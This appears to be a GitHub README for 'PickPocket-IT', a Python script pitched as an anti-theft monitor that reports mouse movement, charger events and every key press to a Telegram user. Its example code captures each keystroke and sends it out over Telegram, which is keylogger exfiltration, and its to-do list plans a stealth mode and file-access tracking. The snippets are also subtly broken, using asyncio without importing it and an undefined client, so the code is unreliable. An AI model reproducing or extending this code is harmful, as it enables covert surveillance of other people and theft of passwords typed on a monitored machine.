# 🕵️‍♂️ PickPocket-IT

**PickPocket-IT** is a Python script designed for monitoring and reporting specific events like **Mouse Movements**, **Key Presses**, and **Charger Plug/Unplug** actions to a target **Telegram user**. Perfect for discreetly tracking activity in public places, study halls, or personal environments where your stuff is left unattended.

---

## 🔧 Features
- **Mouse Movement Tracking**: Detects and reports mouse movements.
- **Key Press Tracking**: Captures key presses and sends them to your Telegram account.
- **Charger Detection**: Monitors charger plug/unplug events.
- **Telegram Notifications**: Sends real-time notifications to a specified Telegram user.

---

## 📋 Requirements

To run this script, you will need:
- **Python 3.12+** (Make sure Python is installed and added to PATH)
- **Required Python Libraries**:
    - `telethon`: For interacting with Telegram.
    - `pynput`: To monitor keyboard and mouse activity.
    - `psutil`: To detect system status like charger plug/unplug events.

Install all the required dependencies using the following command:

```bash
pip install psutil telethon pynput

⚙️ Setup & Usage
1. Clone the Repository
Start by cloning this repository to your local machine:

bash
Copy code
git clone https://github.com/yourusername/PickPocket-IT.git
cd PickPocket-IT
2. Install Dependencies
Install the required libraries using pip:

bash
Copy code
pip install psutil telethon pynput
3. Set Up Telegram Bot
Create a bot using BotFather on Telegram and get your API_ID, API_HASH, and the target Telegram user ID where you want the reports sent.
4. Run the Script
After configuring the script, simply run it:

bash
Copy code
python pickpocket.py
📄 Example Code
Here's a quick example of how the script works:

Monitor Mouse Movements:
python
Copy code
import time
from pynput.mouse import Listener
from telethon import TelegramClient

async def send_message(message):
    async with TelegramClient('session_name', api_id, api_hash) as client:
        await client.send_message('target_telegram_id', message)

def on_move(x, y):
    print(f"Mouse moved to ({x}, {y})")
    asyncio.run_coroutine_threadsafe(send_message("Mouse moved."), client.loop)

with Listener(on_move=on_move) as listener:
    listener.join()
Capture Key Presses:
python
Copy code
from pynput.keyboard import Listener

def on_press(key):
    print(f"Key {key} pressed.")
    asyncio.run_coroutine_threadsafe(send_message(f"Key {key} pressed."), client.loop)

with Listener(on_press=on_press) as listener:
    listener.join()
Detect Charger Plug/Unplug Events:
python
Copy code
import psutil

def monitor_charger():
    if psutil.sensors_battery().power_plugged:
        asyncio.run_coroutine_threadsafe(send_message("Charger plugged in."), client.loop)
    else:
        asyncio.run_coroutine_threadsafe(send_message("Charger unplugged."), client.loop)
🚀 How It Works
Mouse Movement: The script tracks the position of the mouse and sends a notification to Telegram whenever the mouse moves.
Key Presses: Every time a key is pressed on the keyboard, it sends a message with the key to the target Telegram user.
Charger Events: Monitors whether your charger is plugged in or unplugged and sends the status to your Telegram user.
🎯 To-Do / Future Enhancements
Add stealth mode to run the script in the background.
Include more event tracking features (e.g., file access, app switching).
Improve error handling for better stability and performance.
📝 License
This project is licensed under the MIT License - see the LICENSE file for details.

🤝 Contributing
Contributions are always welcome! Feel free to fork the repository, submit issues, and create pull requests. Please make sure to follow the coding standards and write tests for new features.

📬 Contact
For any issues or suggestions, please feel free to contact me via Email.
